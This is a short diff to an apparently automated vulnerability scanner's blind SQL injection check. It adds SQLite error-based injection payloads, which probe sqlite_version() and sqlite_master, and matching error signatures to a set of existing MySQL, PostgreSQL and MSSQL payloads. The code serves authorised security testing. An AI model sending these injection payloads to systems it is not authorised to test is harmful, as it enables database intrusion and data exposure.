@@ -3919,10 +3919,16 @@ def verify_generic_sqli_blind(
             "mysql_xp2": f"{orig_value} AND extractvalue(1,concat(0x7e,version()))-- -",
             "pg_cast": f"{orig_value}' AND CAST(version() AS INTEGER)-- -",
             "mssql_conv": f"{orig_value}' AND 1=CONVERT(int,@@version)-- -",
+            # SQLite3: no error functions, but syntax errors leak query structure
+            "sqlite_syntax": f"{orig_value}' AND 1=CAST(sqlite_version() AS BLOB)-- -",
+            "sqlite_bare": f"{orig_value}' AND 1=(SELECT 1 FROM sqlite_master LIMIT 1)-- -",
         }
         _eb_sigs = ("extractvalue", "XPATH syntax error", "updatexml", "SQL syntax",
                     "mysql_num_rows", "PG::InvalidTextRepresentation",
-                    "Conversion failed when converting", "ODBC SQL Server Driver")
+                    "Conversion failed when converting", "ODBC SQL Server Driver",
+                    # SQLite3 error signatures
+                    "sqlite3.OperationalError", "no such function", "near \"",
+                    "unrecognized token", "incomplete input", "sqlite_version")
         for _eb_key, _eb_p in _eb_payloads.items():
             try:
                 _eb_pl = dict(base_params); _eb_pl[sqli_param] = _eb_p
